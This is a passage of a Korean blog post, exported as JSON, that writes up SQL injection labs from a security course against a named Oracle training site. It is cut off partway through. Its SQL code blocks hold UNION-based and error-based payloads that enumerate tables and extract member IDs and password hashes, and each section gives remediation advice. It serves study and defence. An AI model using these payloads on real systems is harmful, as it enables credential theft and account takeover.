@@ -1,0 +1,4652 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "195deac9-942c-50cc-bb97-98c63f3af522",
+  "title": "[모의해킹 실습] SQLi - UNION·오류 기반·Blind·정렬 조건",
+  "kind": "posts",
+  "slug": "pentest-lab-2026-sqli",
+  "description": "1~3일차 SQL 인젝션 실습 7개를 통합했다. 우편번호 검색, 로그인, 연봉·날짜 검색, 정렬 기능의 입력 문맥과 참·거짓 응답을 비교하고 확인 범위와 대응 방법을 정리한다.",
+  "category": "SK Rookies / 수업 정리",
+  "date": "2026-11-07",
+  "tags": [
+    "SQLi",
+    "Oracle",
+    "MySQL",
+    "모의해킹"
+  ],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-11-07T06:11:23.541Z",
+  "updatedAt": "2026-11-07T06:11:23.541Z",
+  "sourceDigest": "75747c6d9e34184695625ee2fcd33cb50d4078275e98754c13cc366d9958d163",
+  "assets": [
+    {
+      "id": "1babf3c7-7968-517c-ac92-b9d7fa00a267",
+      "name": "s01-image5.png",
+      "type": "image/png",
+      "path": "/assets/uploads/195deac9-942c-50cc-bb97-98c63f3af522/1babf3c7-7968-517c-ac92-b9d7fa00a267.png",
+      "sha": "14eb78a902db8789a5c82486c4364b0e8eaa76c2"
+    },
+    {
+      "id": "42908375-c033-5365-bb1a-1228f05a10cf",
+      "name": "s02-image3.png",
+      "type": "image/png",
+      "path": "/assets/uploads/195deac9-942c-50cc-bb97-98c63f3af522/42908375-c033-5365-bb1a-1228f05a10cf.png",
+      "sha": "169963d971ff52f5e5b62e9dba91731d9a29b973"
+    },
+    {
+      "id": "141d0ae2-70ce-5b8e-8961-76badb8af795",
+      "name": "s03-image12.png",
+      "type": "image/png",
+      "path": "/assets/uploads/195deac9-942c-50cc-bb97-98c63f3af522/141d0ae2-70ce-5b8e-8961-76badb8af795.png",
+      "sha": "5a1062089ab4961827a963d496943a18cef5273c"
+    },
+    {
+      "id": "6ba18e0b-94b2-50b7-b897-753961d86693",
+      "name": "s06-image19.png",
+      "type": "image/png",
+      "path": "/assets/uploads/195deac9-942c-50cc-bb97-98c63f3af522/6ba18e0b-94b2-50b7-b897-753961d86693.png",
+      "sha": "2a83e703b62f5ee959b3aa5d5276264657bff75d"
+    }
+  ],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "1~3일차 SQL 인젝션 실습 7개를 통합했다. 우편번호 검색, 로그인, 연봉·날짜 검색, 정렬 기능의 입력 문맥과 참·거짓 응답을 비교하고 확인 범위와 대응 방법을 정리한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "실습 기간: 2026년 11월 2~4일 · 정리일: 2026년 11월 7일"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "교육용 실습 환경에서 수행한 원본 기록을 바탕으로 작성했다. 설명과 캡처가 어긋난 부분은 확인 가능한 요청·응답을 기준으로 정리했으며, 아래 결과는 새로 실행한 테스트가 아닌 당시 기록이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "XSS 실습",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://yt010108.github.io/#/post/6c5b1c09-ff15-54c3-aaa5-6280c1a5f2e7"
+                }
+              }
+            ]
+          },
+          {
+            "type": "text",
+            "text": " · "
+          },
+          {
+            "type": "text",
+            "text": "CSRF 실습",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://yt010108.github.io/#/post/e69e7e91-d2c3-56da-9a26-7d555f273aa1"
+                }
+              }
+            ]
+          },
+          {
+            "type": "text",
+            "text": " · "
+          },
+          {
+            "type": "text",
+            "text": "세션 실습",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://yt010108.github.io/#/post/fd66532a-6d6b-5d33-a1dd-0ce18a7cdc16"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "원리와 실습 구성"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "SQL 인젝션은 입력값이 SQL의 데이터로만 처리되지 않고 구문의 의미를 바꿀 때 발생한다. 이번 실습에서는 같은 검색값으로 직접 출력, 오류 메시지, 참·거짓 결과를 각각 관찰했고, 로그인·날짜·정렬처럼 입력이 들어가는 위치가 달라질 때 검증 방법도 달라지는 것을 확인했다."
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "방식"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "정보를 읽는 경로"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "이번 사례"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "UNION 기반"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "정상 조회 결과에 추가된 행·열"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "우편번호 검색"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "오류 기반"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "상세 DB 오류에 포함된 값"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "Oracle Text 오류"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "불리언 기반 Blind"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "결과 유무 또는 로그인 성공·실패"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "테이블명·DB 사용자·DB 이름"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "조건식 구조 변경"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "괄호·주석 처리 뒤 조회 범위 변화"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "연봉 검색"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "조건부 오류를 이용한 Blind"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "ORDER BY의 CASE 분기에 따른 응답 차이"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "정렬 방향 매개변수"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "앞의 세 사례는 같은 우편번호 조회 지점을 서로 다른 방법으로 검증했다. 이 글의 “7개”는 실습 시나리오 수이며 독립된 취약 지점 7개를 뜻하지 않는다. 아래 입력은 원문의 관찰을 정리한 것으로, 서버 쿼리 소스를 확보하지 않은 부분은 가설로 표시했다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. UNION 기반 SQL 인젝션"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "항목"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "내용"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "원본"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "1일차 · 2026-11-02"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "확인 지점"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "http://shanky.co.kr:38080/lhs/join/checkPost2.jsp"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "입력값"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "동 이름 검색값 dong"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "요청 방식"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "POST"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "우편번호 조회 기능에서 검색값에 SQL 구문을 삽입하여 회원 테이블의 ID와 비밀번호 해시를 조회하였다. 추출한 정보로 실습 계정의 로그인까지 확인하여 정보 노출이 계정 접근으로 이어질 수 있음을 확인하였다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "확인 과정"
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "작은따옴표 입력 시 ORA-00911 오류가 표시되었다. ORDER BY 3과 ORDER BY 4의 응답 차이로 조회 결과가 세 열로 구성된다고 판단하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "DUAL을 이용한 UNION 조회에서 숫자 한 개와 문자열 두 개가 출력되었다. 이는 해당 값과 결과 열의 자료형 호환성을 확인한 결과이다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "USER_TABLES와 ALL_TAB_COLUMNS의 조회 결과에서 LHSMEMBER3 및 ID, PW 열을 확인하고, UNION 조회로 ID와 비밀번호 해시를 출력하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "해시 조회 도구가 제시한 실습 계정의 비밀번호 후보를 로그인 화면에서 검증하였고, 해당 계정의 로그인 성공 화면을 확인하였다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "동 이름 검색값이 문자열 조건에 들어간다고 가정하고 작은따옴표, 열 수, 자료형 호환성 순서로 범위를 좁혔다. 오류 한 번만으로 취약점을 확정한 것이 아니라, 뒤이어 UNION으로 지정한 값이 실제 응답에 나타나는지 확인했다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "sql"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "-- 동 이름 검색란에 넣은 값: 열 수와 출력 확인\nasd' ORDER BY 3--\nasd' ORDER BY 4--\nasd' UNION SELECT 1, '2', '3' FROM DUAL--\n\n-- 메타데이터와 실습 계정 정보 조회\nasd' UNION SELECT 1, TABLE_NAME, '3' FROM USER_TABLES--\nasd' UNION SELECT 1, COLUMN_NAME, '3' FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='LHSMEMBER3'--\nasd' UNION SELECT 1, ID, PW FROM LHSMEMBER3--"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "ORDER BY 3에서는 결과가 보이고 4에서는 오류가 발생했다. DUAL을 이용한 조회에서 1, 2, 3이 출력되어 세 열의 위치와 숫자·문자열 호환성을 확인했다. 이 결과만으로 원래 열의 정확한 DB 자료형까지 확정하지는 않았다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "원문에서는 LHSBOARD 계열, LHSEMP, LHSMEMBER3, LHSMOBILEMEMBER, LHSPOST 및 테스트 테이블의 열을 살펴봤다. 그중 ID와 PW가 있는 회원 테이블을 추려 정보를 조회했다. 최종 로그인 검증은 실습 계정 하나에서 수행했다. 여러 계정의 해시나 쿠키 원문은 이 글에 싣지 않았다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "비밀번호 확인은 알려진 입력값과 해시의 대응 관계를 이용한 후보 확인이다. 해시는 암호문처럼 복호화하는 대상이 아니며, 64자리라는 길이만으로 SHA-256을 확정할 수도 없다. 원문에서는 도구가 제시한 후보를 실제 로그인 결과로 다시 확인했다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "결과와 보완점"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "ID와 비밀번호 해시 노출 및 실습 계정 로그인 성공을 확인하였다. 해시를 복호화한 것이 아니라, 알려진 입력값과 해시의 대응 관계로 비밀번호 후보를 확인한 것이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "회원 정보가 노출되고, 취약한 비밀번호를 사용하는 계정에 대한 접근으로 확대될 수 있다. 다른 계정 전체의 로그인 가능 여부까지 검증한 것은 아니다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "ALL_TABLES는 현재 사용자에게 접근 가능한 테이블, USER_TABLES는 현재 사용자가 소유한 테이블 범위이다. 64자리라는 길이만으로 해시 알고리즘을 확정하지 않는다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/195deac9-942c-50cc-bb97-98c63f3af522/1babf3c7-7968-517c-ac92-b9d7fa00a267.png",
+          "assetId": "1babf3c7-7968-517c-ac92-b9d7fa00a267",
+          "alt": "UNION으로 지정한 1, 2, 3이 응답의 세 열에 출력된 원본 화면."
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그림 1. UNION으로 지정한 1, 2, 3이 응답의 세 열에 출력된 원본 화면."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "개선 방향: 검색값을 바인드 변수로 처리하고 DB 계정의 조회 권한을 제한한다. 상세 DB 오류를 응답에서 제거하며, 비밀번호는 개별 솔트가 적용되는 전용 비밀번호 해시 방식으로 저장한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "향후 재검증 기준: 같은 입력을 일반 문자열로 처리하는지 확인하고, 회원 테이블의 값과 DB 오류가 응답에 나타나지 않는지 점검한다. 이 기준으로 수정 후 재검증한 기록은 아직 없다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. 오류 기반 SQL 인젝션"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "항목"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "내용"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "원본"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "1일차 · 2026-11-02"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "확인 지점"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "http://shanky.co.kr:38080/lhs/join/checkPost2.jsp"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "입력값"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "동 이름 검색값 dong"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "요청 방식"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "POST"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "우편번호 조회 기능에서 Oracle Text 관련 오류 응답에 조회 결과가 포함되는 현상을 확인하였다. 오류 메시지를 이용해 테이블·열 정보와 실습 계정의 ID 및 비밀번호 해시를 확인하였다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "확인 과정"
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "검색값에 작은따옴표를 입력하여 DB 오류 노출을 확인하였다. CTXSYS.DRITHSX.SN 관련 오류에 조회값이 포함되는 특성을 검증하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "실습 시점의 응답에서 ALL_TABLES 조회 건수 111개와 USER_TABLES 조회 건수 12개를 확인하였다. 두 수치는 조회 범위가 서로 다르다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "ROWNUM 별칭 RNUM으로 행을 선택하며 테이블명과 열명을 확인하였다. LHSMEMBER3에서 열 14개와 ID·PW 열을 확인하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "한 행의 ID와 PW를 함께 연결해 오류 응답에 출력하였다. 해시 조회의 비밀번호 후보와 실습 계정의 로그인 성공 화면을 확인하였다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정상 검색 결과에 원하는 열을 붙이는 대신, Oracle Text 관련 오류에 조회값이 포함되는 응답을 이용했다. 이 함수의 동작과 실행 권한은 실습 환경에서 관찰한 조건이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "sql"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "-- 접근 가능한 테이블 수를 오류 메시지에서 확인\nasd' AND CTXSYS.DRITHSX.SN(user,(SELECT COUNT(TABLE_NAME) FROM ALL_TABLES))=1--\n\n-- 서브쿼리에서 부여한 행 번호로 테이블 선택\nasd' AND CTXSYS.DRITHSX.SN(user,(SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS RNUM FROM USER_TABLES) WHERE RNUM=1))=1--\n\n-- 회원 테이블의 열 수 확인\nasd' AND CTXSYS.DRITHSX.SN(user,(SELECT TO_CHAR(COUNT(*)) FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='LHSMEMBER3'))=1--\n\n-- 같은 행의 ID와 PW를 함께 확인\n' AND CTXSYS.DRITHSX.SN(user,(SELECT ID||'--'||PW FROM (SELECT ID, PW, ROWNUM AS RNUM FROM LHSMEMBER3 WHERE ID='1') WHERE RNUM=1))=1--"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "조회 대상"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "실습 응답"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "해석"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "ALL_TABLES"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "111개"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "현재 사용자에게 접근 가능한 테이블"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "USER_TABLES"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "12개"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "현재 사용자가 소유한 테이블"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "LHSMEMBER3의 열"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "14개"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "회원 테이블의 구조를 좁히는 단서"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "RNUM을 바꾸며 테이블과 열을 확인한 뒤 ID·PW를 한 행에서 함께 조회했다. ROWNUM=1까지 실패하는 것은 아니다. 같은 쿼리 단계에서 ROWNUM>1 조건을 직접 만족시키려는 방식과, 안쪽에서 번호를 붙인 뒤 바깥에서 RNUM을 선택하는 방식을 구분해야 한다. 또한 ORDER BY가 없으면 행 순서는 보장되지 않는다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Oracle Database ROWNUM",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/ROWNUM-Pseudocolumn.html"
+                }
+              }
+            ]
+          },
+          {
+            "type": "text",
+            "text": " · "
+          },
+          {
+            "type": "text",
+            "text": "Oracle Database ALL_TABLES",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "결과와 보완점"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정상 조회 결과 화면을 사용하지 않고도 오류 메시지에서 회원 ID와 비밀번호 해시가 노출되었다. 로그인 성공 화면이 최종 영향의 근거이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "사용자에게 전달되는 상세 오류가 DB 내부 정보의 노출 경로가 된다. 동일 입력 지점의 앞의 UNION 실습과 근본 원인이 겹치므로 별개의 취약 지점으로 중복 집계하지 않는다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "ROWNUM 자체가 데이터의 순서를 보장하지 않는다. 반복 검증에서 같은 행을 비교하려면 고유 키나 명시적인 정렬 기준이 필요하다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/195deac9-942c-50cc-bb97-98c63f3af522/42908375-c033-5365-bb1a-1228f05a10cf.png",
+          "assetId": "42908375-c033-5365-bb1a-1228f05a10cf",
+          "alt": "Oracle 오류 메시지에 테이블 건수 111이 포함된 원본 화면."
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
